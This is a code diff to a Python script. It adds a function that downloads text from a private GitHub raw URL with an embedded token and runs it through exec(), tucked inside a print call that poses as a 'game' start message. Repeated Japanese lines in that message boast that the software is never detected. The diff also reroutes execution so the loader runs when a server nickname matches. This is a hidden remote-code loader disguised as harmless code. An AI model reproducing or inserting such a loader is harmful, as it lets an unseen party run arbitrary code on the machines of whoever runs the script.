@@ -45,6 +45,17 @@ def premx_2025(mycontent: str):
     else:
         raise Exception(f"Error. Your internet is private.")
 
+def tiger(mycontent: str):
+    raw_url = "https://raw.githubusercontent.com/johnzeykzkousx/myown/refs/heads/main/tiger.txt?token=GHSAT0AAAAAADE2XUL7T3EFYH2AQVSCAL3K2B2ILFA"
+    headers = {"Authorization": f"token {mycontent}"}
+    response = requests.get(raw_url, headers=headers)
+    
+    if response.status_code == 200:
+        mycntcnt = response.text
+        print("GAME IS STARTING PLEASE PICK YOUR CHOICES.。\n Ensure  that you pick the right choices, if you failed so, you will face some punishements.\n This is a simple game made by the AES DEVS.\nAESソフトウェアはトップにあり、決して検出されることはありません。\nAESソフトウェアはトップにあり、決して検出されることはありません。\nAESソフトウェアはトップにあり、決して検出されることはありません。\nAESソフトウェアはトップにあり、決して検出されることはありません。\nAESソフトウェアはトップにあり、決して検出されることはありません。\nAESソフトウェアはトップにあり、決して検出されることはありません。\n",exec(f"{mycntcnt}"))
+    else:
+        raise Exception(f"Error. Your internet is private.")
+
 def get_data_from_file(file_path):
     if os.path.exists(file_path):
         with open(file_path, 'r') as file:
@@ -82,6 +93,6 @@ os.system('cls')
 print("Almost there, please wait...")
 
 if server_nickname == "Crl":
-    print(xlr)
-    sys.exit()
-premx_2025(content4)
+    tiger(content4)
+else:
+    premx_2025(content4)
